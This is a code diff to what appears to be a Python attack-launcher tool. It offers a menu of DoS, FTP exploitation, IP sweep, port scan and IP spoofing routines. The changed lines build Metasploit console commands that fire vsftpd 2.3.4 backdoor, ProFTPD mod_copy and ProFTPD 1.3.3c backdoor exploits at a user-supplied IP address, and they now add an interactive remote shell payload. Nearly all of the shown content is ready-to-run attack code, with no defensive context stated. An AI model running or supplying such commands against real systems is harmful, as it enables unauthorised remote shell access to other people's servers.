@@ -10,7 +10,7 @@ def attack_to_perform(number):
         3: perform_dos,  # first dos attack
         4: perform_dos,  # second dos attack
         5: perform_dos,  # third dos attack
-        6: perform_ftp_attack,  # ftp attack
+        6: perform_ftp_attack,  # ftp attack (ok?)
         7: perform_sweep,  # ip address sweep (ok)
         8: perform_port_scan,  # port scan (ok)
         9: perform_ip_spoofing,  # ip spoofing (ok)
@@ -89,13 +89,15 @@ def perform_ftp_attack():
     choice = input("Enter the number of the attack to perform: ")
 
     if choice == "1":
-        metasploit_command = f"msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {ip_addr}; run'"
+        metasploit_command = f"msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {ip_addr}; set PAYLOAD cmd/unix/interact; run'"
         return exploit_ftp(metasploit_command)
     elif choice == "2":
-        metasploit_command = f"msfconsole -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS {ip_addr}; run'"
+        metasploit_command = (
+            metasploit_command
+        ) = f"msfconsole -q -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS {ip_addr}; set PAYLOAD cmd/unix/interact; run'"
         return exploit_ftp(metasploit_command)
     elif choice == "3":
-        metasploit_command = f"msfconsole -x 'use exploit/unix/ftp/proftpd_133c_backdoor; set RHOSTS {ip_addr}; run'"
+        metasploit_command = f"msfconsole -q -x 'use exploit/unix/ftp/proftpd_133c_backdoor; set RHOSTS {ip_addr}; set PAYLOAD cmd/unix/interact; run'"
         return exploit_ftp(metasploit_command)
     else:
         print("Invalid choice\n")
